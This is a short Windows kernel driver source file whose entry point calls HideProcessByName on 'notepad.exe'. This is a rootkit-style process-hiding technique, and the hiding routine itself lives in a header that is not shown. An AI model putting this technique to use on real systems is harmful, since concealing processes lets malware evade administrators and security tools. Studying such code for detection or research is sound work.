#include <ntifs.h>
#include "HideProcess.h"

#define PROCESS_NAME "notepad.exe"

NTSTATUS DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	NTSTATUS ntstatus = STATUS_SUCCESS;

	return ntstatus;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
	NTSTATUS status = STATUS_SUCCESS;

	pDrvObj->DriverUnload = DriverUnload;

	HideProcessByName(PROCESS_NAME);

	//HideProcessByProcessId((HANDLE)9824);

	return status;
}